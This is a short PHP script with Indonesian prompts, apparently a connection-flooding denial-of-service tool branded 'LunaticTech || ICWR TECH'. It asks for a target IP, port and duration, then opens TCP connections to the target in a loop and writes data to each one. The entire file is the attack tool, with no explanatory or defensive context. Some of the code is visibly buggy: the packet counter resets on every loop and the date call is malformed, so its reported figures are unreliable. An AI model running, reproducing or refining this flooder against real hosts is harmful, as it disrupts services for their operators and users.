<?php
error_reporting(0);


echo "##################################\n";
echo "##  LunaticTech  || ICWR TECH  ##\n";
echo "## lunatictech.xyz | icwr-tech ##\n";
echo "##################################\n";


echo "\nMasukkan IP :";
$ip = trim(fgets(STDIN));
echo"\nMasukan Port Target :";
$port = trim(fgets(STDIN));
echo"\nMasukan Max Size : ";
$max = trim(fgets(STDIN));
echo"\nMasukan Max Waktu: ";
$exec_time = trim(fgets(STDIN));

echo "Cek Koneksi....\n";
   
     $soket = fsockopen('tcp://'.$ip,$port,$errno,$errstr,5);
     
     if(!$soket){
		 echo "Koneksi Ke Target Gagal !!!!\n";
		 exit();
	 }

echo "Koneksi Berhasil... \n";

 $time = time();
        echo "Started: ".time('d-m-y h:i:s').".......\n";
        $max_time = $time+$exec_time;
     

for($paket=0;$paket<$max;$paket++){
     $out = 'X';
     

} while(1){
 if(time() > $max_time){
                        break;
                }           
$apa = 0;
$apa++;
echo "Packet = > $apa(".round(($apa*65)/1024,2).") \n";
$fp = fsockopen('tcp://'.$ip,$port,$errno,$errstr,5);
if($fp){


fwrite($fp,$out);
fclose($fp,$out);

}

}

echo"\nPaket Telah Terikirim Sebesear $apa(".round(($apa*65)/1024,2).")  Packets  !!!\n Success \n";
  

?>
